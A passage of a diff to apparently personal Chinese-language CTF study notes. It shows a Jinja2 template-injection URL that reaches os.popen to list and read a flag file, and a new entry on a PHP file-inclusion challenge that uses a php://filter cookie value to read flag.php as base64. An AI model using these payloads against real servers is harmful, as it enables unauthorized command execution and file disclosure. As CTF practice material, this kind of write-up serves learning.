@@ -220,3 +220,12 @@ __globals__：对包含函数全局变量的字典的引用-首先，找到当�
 `http://111.198.29.45:46675/%7B%7B''.__class__.__mro__[2].__sub
 classes__()[71].__init__.__globals__['os'].popen('ls').read()%7D%7D`
 找到了一个fl4g index.py文件，运行cat命令查看该文件(把popen括号后的ls改为cat fl4g)   找到flag
+2026.1.15
+1.文件包含
+题目给出了index.php的文件目录，提示flag在flag.php的文件下，猜测flag.php属于index.php
+题目提示“请选择你的语言”，利用hackbar修改language的值
+分析代码，说明flag的数据来自cookie  hackbar：
+cookie：language=php://filter/read=convert.base64-encode/resource=/var/www/html/flag
+出现base64，解密
+或者bp抓包，发现cookie的值
+sent给response
